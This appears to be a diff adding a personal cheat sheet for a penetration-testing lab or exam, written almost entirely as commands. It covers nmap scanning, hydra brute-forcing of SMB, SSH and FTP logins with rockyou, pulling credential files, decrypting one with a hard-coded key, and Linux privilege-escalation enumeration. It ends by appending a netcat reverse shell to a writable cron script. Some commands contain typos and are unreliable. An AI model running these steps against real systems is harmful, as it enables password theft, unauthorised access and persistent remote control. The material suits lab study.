@@ -1,0 +1,57 @@
+
+# nmap -sV --script dns-service-discovery 192.168.173.138
+OR 
+enum4linux -a 192.168.173.138
+
+
+# nmap -sV --script banner 192.168.174.0/24
+
+
+nmap -p 139,445 --script smb-enum-shares,smb-enum-users 192.168.0.0/24
+Crack password
+hydra -l henry -P /usr/share/wordlists/rockyou.txt smb://192.168.0.5
+access smb folder
+smbclient //192.168.174.X/SMBShare -U henry
+ls to check the file
+use get command to take the file
+then decode it
+you can copy the content to a new file and decode that file
+openssl enc -aes-256-cbc -d -salt -base64 -in encrypted.txt -k pass1Henry
+
+
+
+# nmap -sV -p- --script vuln 192.168.0.0/24
+Then if you get it the IP you can start bruteforce the password and username
+# hydra -L simpleusernames.txt -P rockyou.txt ssh://192.168.174.140 -t 4
+Once you have a password, use it to gain access to the machine and find the file 
+# find / -name NetworkPass.txt 2>/dev/null
+
+
+# nmap -p 21 -sV 192.168.0.0/24
+Then if you get it the IP you can start bruteforce the password and username
+# hydra -L simpleusernames.txt -P rockyou.txt ftp://192.168.174.140 -t 4
+Once you have a password, use it to gain access to the machine and find the file 
+# ftp 192.168.174.139
+# ls
+# get Credential.txt
+
+
+Ssh to the machine and enumerate all users by cat passwd file. Check all users
+Check the OS information
+# cat /etc/issue
+# cat /etc/os-realease and # uname -a
+Check the process running with privileged user
+# ps aux
+You can check the cron jobs too to find if we can get any misconfig permission on those files
+# ls -lah /etc/cron*
+User current cron job # crontab -l
+Check also for the writable files # find / -writable -type d 2>/dev/null
+And # find / -pem -u=s -type f 2>/dev/null
+Now, check for the env variables by command
+# env
+Confirm with # cat .bashrc
+You can run ps command too
+# watch -n 1 “ps -xua | grep pass”
+Also, you can run # tcpdump -i lo -A | grep  “pass” 
+If you find writable crontab file just append this line
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attackerIP> 1234 >/tmp/f" >> userbackup.sh
